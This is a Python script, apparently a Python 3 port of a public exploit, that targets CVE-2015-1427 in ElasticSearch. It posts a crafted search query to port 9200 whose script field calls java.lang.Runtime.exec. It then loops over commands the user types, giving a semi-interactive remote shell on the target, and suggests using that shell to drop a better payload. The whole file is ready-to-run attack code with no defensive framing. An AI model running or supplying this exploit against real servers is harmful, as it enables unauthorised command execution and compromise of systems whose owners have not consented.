#!/bin/python3
# coding: utf-8
# Author: Darren Martyn, Xiphos Research Ltd.
# Version: 20150309.1
# Code edit by

import json
import requests
import sys
# import readline

# # 命令自动补全功能
# readline.parse_and_bind('tab: complete')
# # 开启VI编辑模式
# readline.parse_and_bind('set editing-mode vi')
__version__ = "20150309.1"


def banner():
	print("""Exploit for ElasticSearch , CVE-2015-1427   Version: %s""" % (__version__))


def execute_command(target, command):
	payload = """{"size":1, "script_fields": {"lupin":{"script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"%s\\").getText()"}}}""" % (command)
	try:
		url = "http://%s:9200/_search?pretty" % (target)
		r = requests.post(url=url, data=payload)
	except Exception as e:
		sys.exit("Exception Hit" + str(e))
	values = json.loads(r.text)
	fuckingjson = values['hits']['hits'][0]['fields']['lupin'][0]
	print(fuckingjson.strip())


def exploit(target):
	print("{*} Spawning Shell on target... Do note, its only semi-interactive... Use it to drop a better payload or something")
	while True:
		# cmd = raw_input("~$ ")
		# python3 raw_input为input
		cmd = input("~$ ")
		if cmd == "exit":
			sys.exit("{!} Shell exiting!")
		else:
			execute_command(target=target, command=cmd)


def main(args):
	banner()
	if len(args) != 2:
		sys.exit("Use: %s target" % (args[0]))
	exploit(target=args[1])


if __name__ == "__main__":
	main(args=sys.argv)